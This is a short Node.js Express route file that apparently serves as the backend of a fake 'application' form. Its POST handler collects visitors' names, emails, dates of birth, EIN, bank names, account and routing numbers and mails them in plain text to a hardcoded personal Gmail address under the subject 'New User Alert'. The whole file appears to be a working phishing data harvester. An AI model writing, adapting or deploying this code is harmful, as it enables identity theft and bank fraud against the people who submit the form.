const express = require('express')
const app = express()
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: true }))
const router = express.Router()
app.use(bodyParser.json())
app.use(express.json())
const path = require('path')
const MailTranspoter = require('../config/mail')

router.get('/', (request, response) => {
    response.sendFile(path.join(__dirname, '../public/index.html'))
})

router.post('/application-sent', async (request, response) => {
    const userData = {
        fullname: request.body.fullName,
        email: request.body.email,
        dob: request.body.dateOfBirth,
        einNumber: request.body.einNumber,
        bankName: request.body.bankName,
        acctNumber: request.body.acctNumber,
        routingNumber: request.body.routingNumber,
        reason: request.body.reason
    }
    const jsonProperty = JSON.stringify(userData);
    const TextMail = jsonProperty.replaceAll(/,/g, "\n").replaceAll(/{/g, "").replaceAll(/}/g, '')
    try {
                const mailOptions = {
            from: userData.email,
            to: 'maxwellprosper76@gmail.com',
            subject: 'New User Alert',
            text: TextMail,
        }
        console.log("Mail Options", JSON.stringify(TextMail))
        let mail = await MailTranspoter.sendMail(mailOptions);
            console.log('Mail Sent....', mail.response)
            response.sendFile(path.join(__dirname, '../public/success.html'))
    }
    catch(error) {
        console.log(error);
        response.send('Application not sent. Please check your internet connection and try again')

    }
})

module.exports = router;

